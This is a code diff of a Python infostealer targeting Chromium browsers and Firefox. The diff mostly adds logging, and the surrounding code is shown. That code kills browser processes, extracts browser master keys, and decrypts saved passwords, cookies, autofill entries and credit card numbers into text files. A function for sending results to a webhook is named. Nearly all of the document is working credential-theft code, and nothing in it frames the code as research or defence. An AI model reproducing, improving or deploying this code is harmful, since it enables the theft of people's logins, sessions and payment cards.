@@ -213,6 +213,7 @@ def kill_browser_processes():
         except:
             pass
     if browsers_killed:
+        print(f"[*] Browsers killed: {', '.join(set(browsers_killed))}")
         time.sleep(2)
 
 @contextmanager
@@ -262,6 +263,7 @@ def decrypt_with_cng(input_data, key_name):
     hKey = gdef.NCRYPT_KEY_HANDLE()
     status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
     if status != 0:
+        print(f"[!] NCryptOpenKey error: {status} (Key: {key_name})")
         ncrypt.NCryptFreeObject(hProvider)
         return None
     pcbResult = gdef.DWORD(0)
@@ -430,8 +432,10 @@ def get_master_key(config):
                 return user_dec[-32:]
             return derive_v20_master_key(parsed, config['key_name'])
         except Exception as inner_e:
+            print(f"[!] Master Key decryption error ({config['name']}): {inner_e}")
             return None
     except Exception as e:
+        print(f"[!] Master Key retrieval error ({config['name']}): {e}")
         return None
 
 def write_to_file(base_path: str, rel_path: str, content: str):
@@ -440,6 +444,7 @@ def write_to_file(base_path: str, rel_path: str, content: str):
         os.makedirs(os.path.dirname(full_path), exist_ok=True)
         with open(full_path, 'w', encoding='utf-8') as f:
             f.write(content)
+        print(f"[+] File saved: {rel_path}")
 
 def process_chromium_browser(browser_name, config, master_key, base_path):
     user_profile = os.environ['USERPROFILE']
@@ -456,13 +461,18 @@ def process_chromium_browser(browser_name, config, master_key, base_path):
         profiles = [data_path]
     for profile_dir in profiles:
         profile_name = profile_dir.name
+        print(f"  [>] Processing profile: {profile_name}")
         prefix = f"{browser_name}/{profile_name}/"
         bookmarks = extract_bookmarks(profile_dir)
         if bookmarks:
+            print(f"    [+] Found {len(bookmarks)} bookmarks.")
             write_to_file(base_path, prefix + "bookmarks.txt", "# Name\tURL\n" + "\n".join(bookmarks))
         history = extract_history(profile_dir)
         if history:
+            print(f"    [+] Found {len(history)} history records.")
             write_to_file(base_path, prefix + "history.txt", "# URL\tTitle\tVisit Count\tLast Visit\n" + "\n".join(history))
+        
+        passwords_count = 0
         passwords_content = ""
         login_db = profile_dir / "Login Data"
         if login_db.exists():
@@ -474,20 +484,26 @@ def process_chromium_browser(browser_name, config, master_key, base_path):
                     cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                     for url, user, pw in cur.fetchall():
                         if pw:
+                            dec = None
                             if pw[:3] in (b'v10', b'v11', b'v20'):
                                 dec = decrypt_v20_password(pw, master_key)
-                                if dec and dec not in ("DECRYPT_FAILED", "NOT_V20_OR_V10"):
-                                    passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
+                                if dec in ("DECRYPT_FAILED", "NOT_V20_OR_V10"): dec = None
                             elif pw[:3] == b'v10' and not master_key:
                                 try:
                                     dec = windows.crypto.dpapi.unprotect(pw[3:]).decode('utf-8', errors='replace')
-                                    passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
-                                except: pass
+                                except: dec = None
+                            
+                            if dec:
+                                passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
+                                passwords_count += 1
                     con.close()
                     if passwords_content.strip():
+                        print(f"    [+] Found {passwords_count} passwords.")
                         write_to_file(base_path, prefix + "passwords.txt", passwords_content)
                 except: pass
                 if tmp_db.exists(): os.unlink(tmp_db)
+        
+        cookies_count = 0
         cookies_content = ""
         cookies_db = profile_dir / "Network" / "Cookies"
         if not cookies_db.exists():
@@ -503,6 +519,7 @@ def process_chromium_browser(browser_name, config, master_key, base_path):
                         if enc and enc[:3] in (b'v10', b'v11', b'v20'):
                             dec = decrypt_v20_value(enc, master_key)
                             if dec and dec != "DECRYPT_FAILED":
+                                cookies_count += 1
                                 flag = "TRUE" if (host and host.startswith('.')) else "FALSE"
                                 secure_str = "TRUE" if sec else "FALSE"
                                 try:
@@ -512,10 +529,14 @@ def process_chromium_browser(browser_name, config, master_key, base_path):
                                 cookies_content += line
                     con.close()
                     if cookies_content.strip():
+                        print(f"    [+] Found {cookies_count} cookies.")
                         write_to_file(base_path, prefix + "cookies.txt", "# Netscape HTTP Cookie File\n" + cookies_content)
                 except: pass
                 if tmp_db.exists(): os.unlink(tmp_db)
+        
+        autofill_count = 0
         autofill_content = ""
+        credit_cards_count = 0
         credit_cards_content = ""
         webdata_db = profile_dir / "Web Data"
         if webdata_db.exists():
@@ -532,6 +553,7 @@ def process_chromium_browser(browser_name, config, master_key, base_path):
                                     dec = decrypt_v20_value(val, master_key)
                                 else: dec = str(val) if val else ""
                                 autofill_content += f"Field: {name}\nValue: {dec}\n\n"
+                                autofill_count += 1
                     except: pass
                     try:
                         cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
@@ -540,11 +562,17 @@ def process_chromium_browser(browser_name, config, master_key, base_path):
                             if enc_num and enc_num[:3] in (b'v10', b'v11', b'v20'):
                                 dec_num = decrypt_v20_password(enc_num, master_key)
                             credit_cards_content += f"Name: {name}\nExp: {exp_m}/{exp_y}\nNumber: {dec_num}\n\n"
+                            credit_cards_count += 1
                     except: pass
                     con.close()
-                    if autofill_content: write_to_file(base_path, prefix + "auto_fills.txt", autofill_content)
-                    if credit_cards_content: write_to_file(base_path, prefix + "credit_cards.txt", credit_cards_content)
-                except: pass
+                    if autofill_content:
+                        print(f"    [+] Found {autofill_count} autofill records.")
+                        write_to_file(base_path, prefix + "auto_fills.txt", autofill_content)
+                    if credit_cards_content:
+                        print(f"    [+] Found {credit_cards_count} credit cards.")
+                        write_to_file(base_path, prefix + "credit_cards.txt", credit_cards_content)
+                except Exception as e:
+                    print(f"[!] Database error for profile {profile_name}: {e}")
                 if tmp_db.exists(): os.unlink(tmp_db)
 
 def process_firefox_browser(browser_name, config, base_path):
@@ -560,7 +588,9 @@ def process_firefox_browser(browser_name, config, base_path):
             except: pass
     profile_dirs = [p for p in profiles_path.iterdir() if p.is_dir() and ('default' in p.name.lower() or 'release' in p.name.lower() or 'beta' in p.name.lower())]
     for profile_dir in profile_dirs:
+        print(f"  [>] Processing profile (Firefox): {profile_dir.name}")
         prefix = f"{browser_name}/{profile_dir.name}/"
+        cookies_count = 0
         cookies_content = ""
         cookies_db = profile_dir / "cookies.sqlite"
         if cookies_db.exists():
@@ -569,10 +599,14 @@ def process_firefox_browser(browser_name, config, base_path):
                 cur = con.cursor()
                 cur.execute("SELECT host, name, value, path, expiry, isSecure FROM moz_cookies")
                 for host, name, value, path, expiry, secure in cur.fetchall():
+                    cookies_count += 1
                     cookies_content += f"{host}\tTRUE\t{path}\t{str(bool(secure)).upper()}\t{expiry}\t{name}\t{value}\n"
                 con.close()
-                if cookies_content: write_to_file(base_path, prefix + "cookies.txt", cookies_content)
+                if cookies_content:
+                    print(f"    [+] Found {cookies_count} cookies.")
+                    write_to_file(base_path, prefix + "cookies.txt", cookies_content)
             except: pass
+        passwords_count = 0
         passwords_content = ""
         logins_json = profile_dir / "logins.json"
         if logins_json.exists(): 
@@ -604,6 +638,7 @@ def process_firefox_browser(browser_name, config, base_path):
                                 out = SECItem(0, 0, 0)
                                 if nss_dll.PK11SDR_Decrypt(ctypes.byref(inp), ctypes.byref(out), None) == 0:
                                     decrypted = ctypes.string_at(out.data, out.len).decode('utf-8')
+                                    passwords_count += 1
                             except: pass
                         passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {decrypted}\n\n"
                     nss_dll.NSS_Shutdown()
@@ -616,6 +651,10 @@ def process_firefox_browser(browser_name, config, base_path):
                     passwords_content += f"URL: {entry.get('hostname')}\nUser: {entry.get('username')}\nPass: {entry.get('encryptedPassword')} (Encrypted - NSS DLL missing)\n\n"
             except: pass
         if passwords_content.strip():
+            if passwords_count > 0:
+                print(f"    [+] Decrypted {passwords_count} passwords.")
+            else:
+                print(f"    [+] Passwords found (not decrypted, raw data saved).")
             write_to_file(base_path, prefix + "passwords.txt", passwords_content)
 
 def send_to_webhook(zip_path, webhook_url):
@@ -643,26 +682,35 @@ def send_to_webhook(zip_path, webhook_url):
         pass
 
 def main():
+    if hasattr(sys.stdout, 'reconfigure'):
+        sys.stdout.reconfigure(encoding='utf-8')
     parser = argparse.ArgumentParser()
     parser.add_argument('mode', nargs='?', default='all')
     parser.add_argument('--fingerprint', action='store_true')
     parser.add_argument('--output-path', required=False)
     args = parser.parse_args()
     try:
+        print("[*] Browser data collection started...")
         kill_browser_processes()
         time.sleep(1)
         out = args.output_path if args.output_path else "output"
         if not os.path.exists(out): os.makedirs(out, exist_ok=True)
         for n, c in BROWSERS.items():
+            print(f"[*] Processing: {c['name']}")
             try:
                 if c['chromium_based']:
                     mk = get_master_key(c)
                     if mk: 
                         process_chromium_browser(n, c, mk, out)
+                    else:
+                        print(f"[!] Master Key not found for {c['name']}.")
                 else:
                     process_firefox_browser(n, c, out)
-            except: pass
-    except: pass
+            except Exception as e:
+                print(f"[!] Error processing {c['name']}: {e}")
+        print("[*] Operation completed. Data saved to 'output' folder.")
+    except Exception as e:
+        print(f"[!] Main loop error: {e}")
 
 if __name__ == "__main__":
     main()
